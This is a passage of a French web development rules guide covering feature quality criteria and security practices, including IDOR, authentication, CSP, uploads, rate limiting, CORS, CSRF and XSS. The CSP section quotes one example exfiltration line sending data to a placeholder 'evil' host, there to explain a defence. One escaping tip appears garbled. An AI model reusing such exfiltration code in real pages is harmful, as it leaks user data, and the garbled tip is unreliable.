# Regles Universelles - Developpement Web Moderne

> Guide de reference extrait de +50 sessions de developpement en production.
> Applicable a tout projet web (Next.js, React, Vue, etc.) — exemples ecrits pour la stack
> Next.js / Prisma / Tailwind / TypeScript. Une variante sans framework existe :
> `docs/REGLES_UNIVERSELLES_WEB_GENERIC.md`.
> Version 2.10 — Derniere mise a jour : 06/11/2026
>
> **Nouveautes v2.10** — reintegration de la branche parallele v1.3 (04/07/2026, projets money-az et
> fd-sav-2026) et de la CSP de refuge-des-etoiles :
> [profils de projet](#comment-utiliser-ce-guide--profils-de-projet) (Vitrine / SaaS / Entreprise),
> CSP differenciee (1.2), hygiene anti-dette des dependances (13.4),
> [tester le code genere par IA](#177-tester-du-code-genere-par-ia--linvariant-dabord) (17.7), critere
> « teste » de la Definition of Done (17.8),
> [isolation multi-tenant prouvee sur base ephemere](#179-prouver-lisolation-multi-tenant--la-logique-de-securite-base-de-test-ephemere) (17.9),
> nouvelle [section 21 — domaines par archetype](#21-domaines-specifiques-par-archetype-saas--entreprise)
> (paiements, RBAC/SSO/audit, multi-tenant). La checklist devient la section 22.
>
> **Nouveautes v2.9** — report de la variante generique v2.0, en conservant les exemples Next.js.
> L'historique complet est en [fin de document](#historique-des-mises-a-jour).
>
> - **Securite** : alignement sur l'**OWASP Top 10 2025** (supply chain et « mauvaise gestion des
>   conditions exceptionnelles » y entrent) ; [securite par defaut](#10-securite-par-defaut-shift-left)
>   avec anti-IDOR etendu aux **ecritures** ; garde-fous identiques en dev et en prod ;
>   authentification selon **NIST SP 800-63B rev. 4** (longueur plutot que complexite, mots de passe
>   compromis, passkeys) ; en-tetes d'isolation (COOP/CORP) et arbitrage **CSP a nonce vs rendu
>   statique** ; rate limiting (cle par utilisateur, fenetre fixe) ; nouvelles sections
>   [SSRF & appels sortants](#116-ssrf--appels-sortants), [webhooks](#117-webhooks-entrants),
>   [fuites vers des services tiers](#118-ne-jamais-envoyer-un-secret-a-un-service-de-rendu-tiers) ;
>   supply chain npm (delai de quarantaine, Actions epinglees par SHA, permissions minimales).
> - **Responsive** : unites `dvh/svh`, `safe-area-inset`, clavier virtuel, interdiction de bloquer le
>   zoom, cible WCAG 2.2 de 24px, et [mesurer le rendu reel avec les vraies polices](#316-mesurer-le-rendu-reel-ne-pas-lestimer).
>   L'application mobile native passe en [3.18](#318-application-mobile-native-react-native--expo).
> - **Accessibilite** : **WCAG 2.2 AA** et **European Accessibility Act** (en vigueur depuis le 28/06/2025).
> - **Performance** : INP remplace FID, mesure terrain au 75e centile, piege du `lazy` sur l'image LCP,
>   bfcache, cout cache des fonctions serverless.
> - **SEO/GEO** : la section 16 couvre le **GEO** (bloc « en bref », `llms.txt` remis a sa place,
>   citations, schema enrichi, garde-fous automatises) ; `changefreq`/`priority` ignores, rich results
>   HowTo/FAQ restreints, robots des moteurs IA, lecture honnete de la Search Console.
> - **Section 20** etendue : [surfaces declaratives](#209-les-surfaces-declaratives-mentent-en-silence)
>   et [garde-fous dev/prod](#2010-un-garde-fou-doit-se-comporter-pareil-en-dev-et-en-prod).
> - **Nouveau** : [barre de qualite par feature](#0-barre-de-qualite-par-feature-definition-of-done),
>   [regles comptables](#118-regles-comptables-applications-financieres),
>   [documents generes (PDF, CERFA)](#119-documents-generes-pdf-formulaires-officiels),
>   [migrations expand/contract](#184-workflow-de-migration-db),
>   [developpement assiste par agent IA](#139-developpement-assiste-par-un-agent-ia).

---

## Table des matieres

- [Comment utiliser ce guide — profils de projet](#comment-utiliser-ce-guide--profils-de-projet)

0. [Barre de Qualite par Feature (Definition of Done)](#0-barre-de-qualite-par-feature-definition-of-done)
1. [Securite](#1-securite)
2. [RGPD & Conformite](#2-rgpd--conformite)
3. [Responsivite & Mobile](#3-responsivite--mobile)
4. [UX / UI](#4-ux--ui)
5. [Accessibilite (a11y)](#5-accessibilite-a11y)
6. [Performance](#6-performance)
7. [CSS & Styling](#7-css--styling)
8. [Formulaires & Inputs](#8-formulaires--inputs)
9. [Navigation](#9-navigation)
10. [Gestion des Erreurs](#10-gestion-des-erreurs)
11. [Integrite des Donnees](#11-integrite-des-donnees)
12. [Architecture & Scalabilite](#12-architecture--scalabilite)
13. [Maintenabilite & DX](#13-maintenabilite--dx)
14. [Internationalisation (i18n)](#14-internationalisation-i18n)
15. [Observabilite & Monitoring](#15-observabilite--monitoring)
16. [SEO, GEO & Meta](#16-seo-geo--meta)
17. [Tests & Qualite](#17-tests--qualite)
18. [Deploiement & DevOps](#18-deploiement--devops)
19. [Incident Response](#19-incident-response)
20. [Fiabilite des Signaux de Controle](#20-fiabilite-des-signaux-de-controle)
21. [Domaines specifiques par archetype (SaaS / Entreprise)](#21-domaines-specifiques-par-archetype-saas--entreprise)
22. [Checklist Pre-Production](#22-checklist-pre-production)

---

## Comment utiliser ce guide — profils de projet

> Ce guide couvre TOUT le spectre du web, mais **aucun projet n'a besoin de tout**. Appliquer tout
> le guide a un site vitrine est aussi contre-productif que d'en ignorer la moitie sur un SaaS.
> Choisissez votre archetype, concentrez-vous sur les domaines 🔴, traitez 🟠 selon vos donnees,
> 🟢 = confort, ⚪ = generalement hors sujet.

**Les trois archetypes :**

- **Vitrine / Landing** — site public, contenu editorial, peu ou pas de comptes.
  Enjeux dominants : SEO, performance/conversion, RGPD cookies, accessibilite (obligation legale sur le public).
- **SaaS** — comptes, donnees multi-tenant, souvent paiements.
  Enjeux dominants : securite/isolation, paiements, RGPD complet, tests, observabilite.
- **App entreprise interne** — utilisateurs authentifies via l'organisation, donnees metier.
  Enjeux dominants : autorisation/SSO/audit, integrite des donnees, accessibilite (obligation), pas de SEO.

| Domaine                                     | Vitrine            | SaaS               | Entreprise           |
| ------------------------------------------- | ------------------ | ------------------ | -------------------- |
| §1 Securite / anti-IDOR                     | 🟠 formulaires     | 🔴                 | 🔴                   |
| §21.2 Autorisation avancee (RBAC/SSO/audit) | ⚪                 | 🟠 selon roles     | 🔴                   |
| §2 RGPD                                     | 🟠 cookies/contact | 🔴 complet         | 🟠 selon donnees     |
| §3 Responsive                               | 🔴                 | 🔴                 | 🟠 (souvent desktop) |
| §5 Accessibilite                            | 🔴 (legal)         | 🔴                 | 🔴 (obligation)      |
| §6 Performance / Core Web Vitals            | 🔴 conversion      | 🟠                 | 🟢 confort           |
| §16 SEO, GEO & Meta                         | 🔴                 | 🟠 pages publiques | ⚪                   |
| §17 Tests (unit + integration)              | 🟢 leger           | 🔴                 | 🔴                   |
| §17.9 Isolation multi-tenant                | ⚪                 | 🔴                 | 🔴                   |
| §21.1 Paiements & abonnements               | ⚪                 | 🔴 (si payant)     | ⚪                   |
| §15 Observabilite & Monitoring              | 🟠                 | 🔴                 | 🟠                   |

> **Projets hybrides** (SaaS avec une vitrine marketing, app interne avec un portail public) : appliquez
> le profil le plus exigeant **a chaque zone**, pas au projet entier. Les sections non listees ici
> (formulaires, navigation, gestion d'erreurs, CSS, maintenabilite…) s'appliquent a tous les archetypes.

---

## 0. Barre de Qualite par Feature (Definition of Done)

> **C'est la regle qui rend toutes les autres applicables au quotidien.**
> Le but : integrer la qualite (securite, responsive, decoupage, a11y) **AU MOMENT d'ecrire la feature**,
> pas la retrofiter via des grands audits reactifs plus tard.
> Une feature n'est PAS "finie" tant que cette barre n'est pas franchie. Pas d'exception "on verra apres".

**Pourquoi cette section existe** : les grands audits a posteriori (audit securite, audit responsive,
decoupage des god components accumules) coutent 5 a 10x plus cher que de respecter ces regles a l'ecriture.
Une feature ecrite "vite et sale" cree une dette qui devra etre payee en backlog. On paie le cout une seule
fois, a l'ecriture.

### 0.1 Definition of Done — checklist OBLIGATOIRE avant de considerer une feature terminee

| Critere                    | Regle non-negociable                                                                                                                                                                   |
| -------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Anti-fuite (securite)**  | Isolation tenant sur CHAQUE requete, en LECTURE comme en ECRITURE. Aucun ID venant du client non verifie. Voir [1.0](#10-securite-par-defaut-shift-left)                               |
| **Responsive = fini**      | Teste sur petit mobile (360-375px). Zero scroll horizontal. Inputs 16px, touch targets 44px. Une feature non-responsive n'est PAS livrable.                                            |
| **Anti-god-component**     | Ecrit DEJA decoupe (hooks + sous-composants). Jamais > 300 lignes. On ne "decoupera pas plus tard". Voir [12.3](#123-regle-anti-god-component)                                         |
| **Accessibilite de base**  | `aria-label` sur les boutons icone-only, labels lies aux inputs, focus visible, contraste AA.                                                                                          |
| **Progressive disclosure** | L'ecran ne noie pas l'utilisateur : l'essentiel d'abord, le detail/avance derriere un repli, un onglet ou un modal.                                                                    |
| **Aide contextuelle**      | Tooltip sur les termes non-evidents + Empty State avec CTA si la page peut etre vide. Voir [4.1](#41-aide-contextuelle-obligatoire-pour-chaque-fonctionnalite)                         |
| **Coherence inter-ecrans** | Les memes donnees affichent les memes valeurs partout (un solde = le meme solde sur toutes les pages).                                                                                 |
| **Presentation serieuse**  | Rendu sobre et professionnel (outil de gestion/finance), pas d'effets visuels tape-a-l'oeil gadget.                                                                                    |
| **Prouve, pas suppose**    | Le comportement a ete **rejoue** (vraie page, vraies donnees, vrai PDF, vraie reponse HTTP), pas deduit d'un build vert. Voir [20](#20-fiabilite-des-signaux-de-controle)              |
| **Surfaces a jour**        | Aide, FAQ, page legale, JSON-LD, landing : tout texte qui decrit la feature est vrai **ce jour-la**. Voir [20.9](#209-les-surfaces-declaratives-mentent-en-silence)                    |
| **Teste**                  | Logique metier non triviale extraite en fonctions pures et testee (nominal + limites + erreurs) ; invariants critiques couverts. Voir [17.8](#178-definition-of-done--critere--teste-) |

### 0.2 Les regles "ecrites des le depart" (vs retrofitees)

Trois regles en particulier ne doivent JAMAIS etre traitees en audit a posteriori, car les retrofiter
est douloureux et risque :

1. **Securite (isolation tenant + RBAC lecture)** — un oubli ici est une fuite de donnees. On l'integre
   a chaque requete des l'ecriture, pas via une passe d'audit qui en oubliera forcement.
2. **Responsive** — refaire le responsive d'un ecran deja code en desktop-only est un quasi-reecriture.
   On code mobile-first directement.
3. **Decoupage (anti-god-component)** — un composant de 800 lignes est un cauchemar a decouper apres coup.
   On ecrit decoupe des la premiere ligne.

> **Pour les apps a forte composante financiere/comptable** : ajouter le critere "regles comptables reelles"
> a la Definition of Done (voir [11.8](#118-regles-comptables-applications-financieres)).

---

## 1. Securite

### 1.0 Securite par defaut (shift-left)

> **Philosophie : la securite s'ecrit en meme temps que la feature, pas en audit a posteriori.**
> Un grand audit securite reactif est le symptome d'une securite qui n'a pas ete integree a l'ecriture.
> L'objectif de cette section est de rendre les audits "a tout va" inutiles : si chaque feature respecte
> ces patterns des le depart, il ne reste qu'a verifier ponctuellement, pas a tout reauditer.

**Le piege le plus frequent et le plus critique vecu : le RBAC en LECTURE (IDOR).**

- Les developpeurs securisent presque toujours les ecritures (create/update/delete) mais oublient
  les **lectures** : une route `GET` qui ne filtre pas par tenant/proprietaire laisse fuiter les donnees
  d'autres utilisateurs/organisations.
- **Regle absolue** : TOUTE requete de lecture doit filtrer par l'identifiant du tenant ET, si la ressource
  est personnelle, par l'identifiant du proprietaire — recuperes depuis la **session server-side**, jamais
  depuis le client.
- **IDOR (Insecure Direct Object Reference)** : ne jamais charger une entite par son seul ID. Toujours
  `WHERE id = :id AND tenant_id = :tenantId` (et `AND owner_id = :userId` si applicable).

```javascript
// INTERDIT — IDOR : n'importe qui avec l'ID accede a la ressource
const doc = await db.documents.findUnique({ where: { id } })

// OBLIGATOIRE — l'ID seul ne suffit jamais
const doc = await db.documents.findFirst({
  where: { id, tenantId: session.tenantId }, // + ownerId si ressource personnelle
})
if (!doc) throw new NotFoundError('Document') // 404, pas 403 (pas de fuite d'existence)
```

**Le second piege : l'IDOR en ECRITURE apres une lecture verifiee.**

- Verifier la propriete avec un `findFirst({ id, tenantId })` puis ecrire avec `update({ where: { id } })`
  laisse une fenetre (race condition) et, surtout, rend l'ecriture **non auto-protegee** : le jour ou
  quelqu'un supprime la lecture prealable, la faille s'ouvre sans bruit.
- **Regle** : le filtre tenant figure dans le `where` **de l'operation d'ecriture elle-meme**
  (`updateMany`/`deleteMany({ where: { id, tenantId } })` + verifier le nombre de lignes touchees).

```javascript
// INTERDIT — la verification et l'ecriture sont decouplees
const fy = await db.fiscalYears.findFirst({ where: { id, tenantId } })
if (!fy) throw new NotFoundError('Exercice')
await db.fiscalYears.update({ where: { id }, data }) // ecriture par ID seul

// OBLIGATOIRE — l'ecriture porte son propre filtre
const { count } = await db.fiscalYears.updateMany({ where: { id, tenantId }, data })
if (count === 0) throw new NotFoundError('Exercice')
```

**Un garde-fou automatique vaut mieux que la discipline** — mais seulement s'il se comporte pareil
partout. Un hook ORM qui refuse toute requete sans `tenantId` sur les modeles multi-tenant est la
meilleure defense ; s'il se contente d'un `console.warn` en dev et ne leve qu'en prod, il ne protege
rien : les violations passent les tests, le build et la CI, puis cassent en production.
**Piege vecu** : une cloture d'exercice comptable a renvoye une 500 en prod (`Missing tenantId in
update()`) alors que tout etait vert. Le garde-fou doit **lever en dev et en test** (voir
[20.10](#2010-un-garde-fou-doit-se-comporter-pareil-en-dev-et-en-prod)).

**Correspondance OWASP Top 10 2025** (a relire a chaque revue de securite) :

| OWASP 2025                                 | Ou c'est traite dans ce document                                      |
| ------------------------------------------ | --------------------------------------------------------------------- |
| A01 Broken Access Control (inclut le SSRF) | 1.0 (IDOR lecture/ecriture), 12.1, [1.16](#116-ssrf--appels-sortants) |
| A02 Security Misconfiguration              | 1.2, 1.6, 1.13, 9.1                                                   |
| A03 Software Supply Chain Failures         | 1.10, 18.5                                                            |
| A04 Cryptographic Failures                 | 1.1, 1.14, 2.6                                                        |
| A05 Injection                              | 1.3, 1.8                                                              |
| A06 Insecure Design                        | 0, 12.1 (tables partagees), 1.15                                      |
| A07 Authentication Failures                | 1.1                                                                   |
| A08 Software or Data Integrity Failures    | 1.10.3, [1.17](#117-webhooks-entrants), 11.7                          |
| A09 Security Logging & Alerting Failures   | 1.11, 15                                                              |
| A10 Mishandling of Exceptional Conditions  | 1.5 (fail-open silencieux), 10.5, 20                                  |

> Les deux nouveautes 2025 (A03 et A10) sont exactement les deux categories ou nos incidents reels
> se sont concentres : une dependance compromise ou cassee, et un controle qui s'eteint sans le dire.

**Checklist securite a appliquer A CHAQUE feature (pas en audit groupe) :**

- [ ] Chaque requete (lecture **et** ecriture) filtre par `tenantId` issu de la session
- [ ] Aucune entite chargee **ni ecrite** par son seul `id` (anti-IDOR, filtre dans le `where` de l'ecriture)
- [ ] Controle de role (RBAC) sur chaque action d'ecriture, pas seulement sur l'affichage du bouton
- [ ] Entrees validees par schema cote serveur (pas seulement cote client)
- [ ] Reponse API minimisee : selection explicite des colonnes, pas de `SELECT *`
- [ ] Action mutante protegee (rate limiting + CSRF/Origin sur les routes API)
- [ ] Aucune donnee sensible loggee (redaction automatique)

> Cette checklist tient en 2 minutes par feature. Faite a chaque fois, elle remplace les audits de masse.

### 1.1 Authentification

- **Hashage des mots de passe** : Argon2id avec PEPPER externe (variable d'environnement, jamais en base)
  - En serverless (Vercel, AWS Lambda) : `memoryCost: 2^14` (16 MB), `timeCost: 3`, `parallelism: 1`
  - Sur serveur dedie : `memoryCost: 2^16` (64 MB), `parallelism: 4`
  - **Piege vecu** : 64 MB de memoire cause des OOM (Out of Memory) sur les conteneurs serverless limites a 128 MB
- **Protection brute-force** : compteur `loginAttempts` + verrouillage temporaire (`lockUntil`)
  - Regle recommandee : 5 echecs = 15 min de blocage
- **CAPTCHA** : Cloudflare Turnstile ou hCaptcha. Bypass automatique en `NODE_ENV === 'development'`
- **Secret JWT/Session** : minimum 32 caracteres, genere avec `openssl rand -base64 32`
- **MFA (Multi-Factor Authentication)** : TOTP au minimum pour les comptes admin et les operations sensibles (suppression de donnees, export massif) ; **passkeys (WebAuthn)** des que possible — c'est le seul facteur resistant au phishing
  - **Le QR code de configuration TOTP se genere LOCALEMENT** (voir [1.18](#118-ne-jamais-envoyer-un-secret-a-un-service-de-rendu-tiers)) : l'URI `otpauth://` contient le secret partage
  - Codes de secours a usage unique, hashes comme des mots de passe
  - Les endpoints de verification MFA / magic-link sont rate-limites comme le login
- **Session management** :
  - Invalider les sessions cote serveur lors du changement de mot de passe **et** de la reinitialisation
  - Expiration des sessions inactives (30 min recommande pour les apps sensibles)
  - Limiter le nombre de sessions simultanees par utilisateur
  - Re-authentification exigee pour les actions critiques (changer l'email, desactiver le MFA, supprimer le compte)

**Politique de mot de passe — NIST SP 800-63B rev. 4 (2025)** : la longueur et la verification
contre les fuites remplacent les regles de complexite.

| Regle                                                          | Pourquoi                                                                    |
| -------------------------------------------------------------- | --------------------------------------------------------------------------- |
| Longueur min. **15** si mot de passe seul, **8** si MFA        | La longueur est le seul facteur qui resiste vraiment                        |
| Longueur max. **>= 64**, espaces et Unicode acceptes           | Les phrases de passe doivent etre possibles                                 |
| **Pas** de regles de composition (maj/chiffre/symbole)         | Elles produisent `Password1!`, pas de l'entropie                            |
| **Pas** de rotation periodique forcee                          | On ne force le changement qu'en cas de compromission                        |
| Verifier contre une **liste de mots de passe compromis**       | API Have I Been Pwned en k-anonymity (seuls 5 caracteres du SHA-1 sortent)  |
| **Autoriser le collage** et les gestionnaires de mots de passe | Bloquer le collage pousse vers des mots de passe faibles (aussi WCAG 3.3.8) |

- **Enumeration de comptes** : message identique **et temps de reponse comparable** que le compte existe ou non (hasher un mot de passe factice quand l'utilisateur est introuvable)
- **Verrouillage** : un verrouillage dur par compte permet a un tiers de bloquer un utilisateur a volonte. Combiner verrouillage temporaire court + rate limiting par IP + CAPTCHA apres N echecs, plutot qu'un verrouillage long

### 1.2 En-tetes HTTP de Securite (OBLIGATOIRES)

```
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: camera=(), microphone=(), geolocation=()
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{random}' 'strict-dynamic'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; font-src 'self'; connect-src 'self' https://api.fournisseur.com; object-src 'none'; base-uri 'self'; form-action 'self'; frame-ancestors 'none'; upgrade-insecure-requests
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Resource-Policy: same-origin
X-Permitted-Cross-Domain-Policies: none
```

- `frame-ancestors 'none'` est la version moderne de `X-Frame-Options: DENY` : garder les deux (anciens navigateurs)
- `object-src 'none'` et `base-uri 'self'` sont les deux directives les plus souvent oubliees ; sans `base-uri`, une balise `<base>` injectee detourne tous les scripts relatifs
- **COOP `same-origin`** isole la fenetre des popups cross-origin (attaques type XS-Leaks). Attention : casse les flux OAuth/paiement en popup — utiliser `same-origin-allow-popups` dans ce cas
- `X-XSS-Protection` est **obsolete** : ne plus l'envoyer (ou `0`)
- **HSTS `preload`** est quasi irreversible (des mois pour sortir de la liste) : ne l'activer qu'une fois **tous** les sous-domaines en HTTPS

**CSP avancee** :

- Utiliser des nonces (`'nonce-{random}'`) + `'strict-dynamic'` plutot que `'unsafe-inline'` et des listes de domaines pour les scripts
- **`img-src https:` est un canal d'exfiltration** (`new Image().src = 'https://evil/?' + data`) qui rend l'allowlist `connect-src` decorative : lister les domaines d'images reellement utilises
- **Trusted Types** (`require-trusted-types-for 'script'`) pour les apps riches en manipulation DOM : rend les sinks XSS (`innerHTML`) inutilisables sans politique explicite
- Ajouter `report-to` pour monitorer les violations CSP
- Commencer en mode `Content-Security-Policy-Report-Only` puis passer en mode bloquant

**Arbitrage CSP a nonce vs rendu statique (a decider, pas a subir)** :

- Un nonce est **par requete** : sur les frameworks a rendu statique/ISR (Next.js App Router, etc.),
  une CSP a nonce rend **chaque page dynamique** — perte du prerendu et du cache edge, donc de la
  performance et d'une partie du SEO des pages marketing
- Alternatives : CSP a **hash** (`'sha256-...'`) pour les scripts inline stables ; nonce uniquement
  sur l'app connectee (deja dynamique), `unsafe-inline` assume et documente sur le site vitrine
- Si on garde `unsafe-inline`, **l'ecrire, le dater, le motiver** et noter ce qui rouvre le sujet.
  Les durcissements de second rideau (`img-src`, `connect-src`) ont alors peu de valeur : un attaquant
  qui injecte un script a deja gagne l'essentiel
- **Une note de scanner d'en-tetes (A, A+) ne mesure pas le risque reel** : elle ignore l'isolation
  tenant, l'auth, les controles qui s'eteignent en silence. Ne pas laisser un rapport de scanner
  dicter les priorites. Et verifier ses alertes : un `Access-Control-Allow-Origin: *` pose par le CDN
  sur du HTML public prerendu n'est pas la CORS de l'API (voir 1.6)

**CSP differenciee — mise en oeuvre (concilie securite ET perf)** :

- Le nonce doit etre **unique par requete** : il est genere dans le middleware/proxy, pose sur l'en-tete
  `Content-Security-Policy` ET transmis au framework (en-tete `x-nonce`) pour qu'il l'applique a tous
  les `<script>` qu'il injecte. Les pages prerendues statiquement n'ont pas de nonce : leurs scripts
  inline seraient bloques
- **Routes dynamiques** (auth, back-office, formulaires sensibles, tunnels de paiement) : CSP **stricte
  a nonce** + `'strict-dynamic'`. Cout perf nul (deja dynamiques), protection maximale la ou sont les
  donnees sensibles
- **Pages vitrines statiques** (accueil, landing, pages legales) : CSP **sans nonce** avec
  `'unsafe-inline'` pour `script-src` : la page **reste prerendue et cachee**. Le middleware choisit la
  variante selon le chemin
- **`'strict-dynamic'` fait ignorer les allowlists d'hotes et `'unsafe-inline'`** : ne pas les melanger
  en croyant cumuler. Un script tiers insere par un script fiable (widget anti-bot charge via
  `createElement`) passe grace a lui. Sur les routes SANS nonce, lister explicitement l'hote tiers
  (ex. `script-src ... https://challenges.cloudflare.com`) + `frame-src` pour son iframe
- `'unsafe-eval'` : **uniquement en developpement** (le framework l'utilise pour le debug), gate par
  `NODE_ENV === 'development'` ; **jamais en production**
- `style-src` : garder `'unsafe-inline'` meme avec un nonce : un nonce ne couvre PAS les attributs
  `style=""` (omnipresents). Le risque XSS via style est faible

### 1.3 Validation des Entrees

- **Zod (ou equivalent) sur TOUTES les entrees** cote client ET serveur
- Ne jamais faire confiance aux donnees du client
- Patterns recommandes :
  - Texte : `.trim()`, `.min(1)`, `.max(longueur_raisonnable)`
  - Montants : `.positive()`, `.max(999_999_999)`
  - Dates : regex ou parseur strict
  - IDs : `.uuid()` ou format attendu
  - HTML/Rich text : sanitiser avec DOMPurify ou sanitize-html avant stockage
  - URLs : valider le protocole (`https://` uniquement), interdire `javascript:`, `data:`

### 1.4 Upload de Fichiers

- **Whitelist MIME** : `['image/jpeg', 'image/png', 'image/webp', 'application/pdf']`
- **Verification double** : verifier le MIME ET les magic bytes (le MIME seul est falsifiable)
- **Prevention path traversal** : sanitiser le nom de fichier (supprimer `../`, `/`, `\`, caracteres speciaux)
- **Taille max** : definir une limite explicite (ex: 5 MB)
- **Chemin de stockage** : inclure un identifiant unique (timestamp, UUID)
- **Scan antivirus** : sur les fichiers uploadables par des utilisateurs externes (ClamAV ou service cloud)
- **Ne jamais servir les uploads depuis le meme domaine** que l'application (utiliser un sous-domaine ou CDN)
- **SVG = HTML executable** : un SVG uploade peut contenir du `<script>`. Soit le refuser, soit le
  sanitiser (DOMPurify profil SVG), soit le servir uniquement avec `Content-Disposition: attachment`
  et une CSP `sandbox`
- **Servir en telechargement** les types non affichables : `Content-Disposition: attachment` +
  `X-Content-Type-Options: nosniff`, jamais de rendu inline d'un document fourni par un tiers
- **Pas de fichiers reels dans le dossier public du depot** (voir [1.15](#115-historique-git--ce-qui-y-entre-nen-sort-pas)) :
  un fallback « stockage disque en dev » qui ecrit dans `public/uploads/` finit commite et deploye

**Piege vecu — le middleware d'auth et les fichiers statiques.** Un document public a telecharger
(`.docx`) arrivait « illisible avec Word ». Le fichier etait sain : le matcher du middleware ne
laissait passer que les images, donc la requete anonyme recevait une **redirection vers la page de
login**, que l'attribut `download` enregistrait sous le nom `.docx`. Le reflexe « ajouter `.pdf|.docx`
au matcher » aurait expose des pieces reelles (RIB, statuts) presentes dans `public/uploads/` et
protegees **uniquement par ce trou dans la regex**. Regles :

- Ouvrir l'acces aux fichiers publics **fichier par fichier** (liste nommee), jamais par extension
- Diagnostiquer par la **reponse HTTP reelle** (`curl -I` sans suivre les redirections), pas en
  inspectant le fichier
- Verifier la suppression d'un asset sur une extension **non interceptee** : sur une extension
  interceptee, la redirection masque l'etat reel du fichier

### 1.5 Rate Limiting

- Implementer sur toutes les routes POST/PUT/DELETE
- Recommandation : 100 req/min par cle pour les routes normales
- Routes sensibles (login, reset password, signup, verification MFA, magic link) : 5-10 req/min par IP **et** par compte vise
- Stack : Redis distribue ou equivalent avec fallback in-memory
- Retourner un `429` avec `Retry-After`, plus `RateLimit-*` (brouillon IETF) ou les historiques `X-RateLimit-Limit` / `X-RateLimit-Remaining`
- **Cle de comptage** : par utilisateur authentifie quand il y en a un, sinon par IP. Compter par IP
  seule fait partager le quota a tout un wifi associatif ou a des milliers d'abonnes mobiles derriere
  le meme NAT operateur (CGNAT) — des 429 en usage normal
- **Fenetre fixe : ne poser l'expiration qu'a la creation du compteur.** Un `INCR` + `EXPIRE` a chaque
  requete repousse la fenetre indefiniment : « 60/min » devient « 60 cumulees jusqu'a une minute de
  silence ». **Piege vecu**, invisible en local parce que le repli memoire, lui, etait correct

```javascript
// INTERDIT — la fenetre glisse a chaque requete et ne se reinitialise jamais en usage actif
await redis.incr(key)
await redis.expire(key, 60)

// OBLIGATOIRE — l'expiration n'est posee qu'une fois, a l'ouverture de la fenetre
const count = await redis.incr(key)
if (count === 1) await redis.expire(key, 60)
```

- **Un controle de securite qui se degrade doit EMETTRE UN SIGNAL** : si le store distant est
  injoignable, le fail-open est parfois le bon arbitrage (ne pas bloquer les utilisateurs), mais
  jamais en silence. Log de niveau `error` + metrique + health-check quotidien de la dependance
- **Piege vecu** : le rate limiting des routes API dependait d'un Redis manage avec un fail-open
  **silencieux**. Il est tombe deux fois (une variable d'environnement mal orthographiee, puis la base
  supprimee) : le rate limiting etait inactif sans qu'aucune alerte ne parte. Un fallback muet n'est
  pas un mode degrade, c'est un controle absent (OWASP A10, voir [section 20](#20-fiabilite-des-signaux-de-controle))
- **Tester le controle, pas sa configuration** : N+30 requetes en rafale sur une route non cachee
  doivent produire N reponses puis des `429`

### 1.6 CORS (Cross-Origin Resource Sharing)

```typescript
// next.config.js ou middleware
const allowedOrigins = [
  'https://monapp.com',
  'https://admin.monapp.com',
  process.env.NODE_ENV === 'development' && 'http://localhost:3000',
].filter(Boolean)

// INTERDIT : Access-Control-Allow-Origin: *  (sauf pour les API publiques sans auth)
// OBLIGATOIRE : whitelist explicite des origines autorisees
```

- **Jamais `*`** sur les routes authentifiees
- Configurer `Access-Control-Allow-Methods` au strict minimum
- Configurer `Access-Control-Allow-Headers` : n'autoriser que les headers necessaires
- `Access-Control-Max-Age: 86400` pour cacher les preflight requests
- **Ne jamais refleter l'en-tete `Origin` recu** dans `Access-Control-Allow-Origin` sans le comparer a la whitelist : c'est un `*` deguise, et avec `Allow-Credentials: true` c'est pire
- **Une CORS permissive « pour le dev » se conditionne explicitement** (`NODE_ENV !== 'production'`) et se verifie sur la prod par une vraie requete
- **Faux positif frequent** : un scanner signale `Access-Control-Allow-Origin: *` sur la page d'accueil. Si c'est le CDN qui le pose sur du HTML public prerendu, ce n'est pas la CORS de l'API. Verifier l'en-tete sur une route API authentifiee avant de « corriger »

### 1.7 CSRF (Cross-Site Request Forgery)

- **Next.js Server Actions** : protection CSRF native (token automatique)
- **API Routes** : implementer une protection manuelle :
  - Double Submit Cookie pattern OU
  - Synchronizer Token pattern OU
  - Verifier le header `Origin`/`Referer`
- **SameSite cookies** : `SameSite=Lax` minimum, `SameSite=Strict` pour les operations sensibles
- **`Sec-Fetch-Site`** (envoye par tous les navigateurs modernes) : refuser les requetes mutantes ou il vaut `cross-site`. Simple et robuste en defense complementaire
- **Jamais de mutation sur un `GET`** : `SameSite=Lax` laisse passer les navigations GET cross-site

```typescript
// Pattern de verification CSRF pour API Routes
function verifyCsrf(req: Request): boolean {
  const origin = req.headers.get('origin')
  const referer = req.headers.get('referer')
  const allowed = process.env.NEXT_PUBLIC_APP_URL
  return origin === allowed || referer?.startsWith(allowed + '/') || false
}
```

### 1.8 Sanitisation XSS

- **Toute donnee affichee provenant de la base doit etre echappee** (React le fait par defaut avec JSX)
- **`dangerouslySetInnerHTML`** : INTERDIRE sauf avec sanitisation prealable
- **Contenu riche (WYSIWYG, Markdown)** : sanitiser a l'entree ET a la sortie

```typescript
import DOMPurify from 'isomorphic-dompurify'

// Sanitiser AVANT stockage en base
const cleanHtml = DOMPurify.sanitize(userInput, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br', 'ul', 'ol', 'li'],
  ALLOWED_ATTR: ['href', 'target'],
})
```

- **Les vecteurs que l'echappement des templates ne couvre pas** :
  - URLs fournies par l'utilisateur dans `href`/`src` : `javascript:` passe a travers l'echappement HTML. Valider le protocole (voir 1.3)
  - JSON injecte dans une balise `<script>` (JSON-LD, etat initial) : un `</script>` dans une donnee ferme la balise. Echapper `<` en `<` a la serialisation
  - Contenus generes hors du navigateur : **emails HTML et PDF** ont leur propre echappement, a tester comme tel
- **Ne jamais toucher une fonction d'echappement par substitution textuelle** : elle contient precisement les sequences qu'on cherche a remplacer (voir [20.7](#207-reecriture-en-masse--passer-par-last-jamais-par-sed))

### 1.9 Rotation & Gestion des Secrets

- **Rotation des secrets** : planifier une rotation tous les 90 jours pour les secrets critiques (JWT secret, API keys)
- **Procedure de rotation** :
  1. Generer le nouveau secret
  2. Deployer avec support du nouveau ET de l'ancien (grace period)
  3. Basculer les clients vers le nouveau
  4. Supprimer l'ancien apres 24h
- **Secrets differents par environnement** : dev, staging, production — JAMAIS les memes
